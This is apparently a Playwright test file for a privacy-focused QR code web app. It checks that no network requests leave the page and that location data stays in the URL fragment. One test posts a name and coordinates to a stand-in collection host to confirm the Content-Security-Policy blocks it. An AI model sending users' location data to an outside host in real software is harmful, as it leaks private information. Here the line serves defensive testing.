import { expect, test } from '@playwright/test';

// These run against the production build, with its Content-Security-Policy.

test('making and saving a QR sends nothing over the network', async ({ page }) => {
  await page.goto('./');
  await page.waitForLoadState('networkidle');

  const requests: string[] = [];
  page.on('request', (request) => requests.push(request.url()));

  await page.getByLabel('Where to?').fill('https://www.google.com/maps/@41.0342,28.9844,15z');
  await expect(page.getByRole('img', { name: /QR code/ })).toBeVisible();
  await page.getByLabel(/^Name/).fill('Ev');
  await page.getByRole('button', { name: 'Save', exact: true }).click();
  await page.getByRole('button', { name: /^Ev/ }).click();

  expect(requests).toEqual([]);
});

test('the page is not allowed to send data anywhere', async ({ page }) => {
  await page.goto('./');
  const outcome = await page.evaluate(() =>
    fetch('https://example.com/collect', { method: 'POST', body: 'Ev, 41.0342, 28.9844' }).then(
      () => 'sent',
      () => 'blocked',
    ),
  );
  expect(outcome).toBe('blocked');
});

test('the destination never reaches the server', async ({ page }) => {
  const served: string[] = [];
  page.on('request', (request) => served.push(request.url()));
  await page.goto('./#v=1&lat=41.0342&lon=28.9844&n=Ev');
  await expect(page.getByRole('heading', { name: 'Ev' })).toBeVisible();
  // URLs as sent on the wire never include the part after "#".
  for (const url of served) expect(url).not.toMatch(/41\.0342|28\.9844|n=Ev/);
});
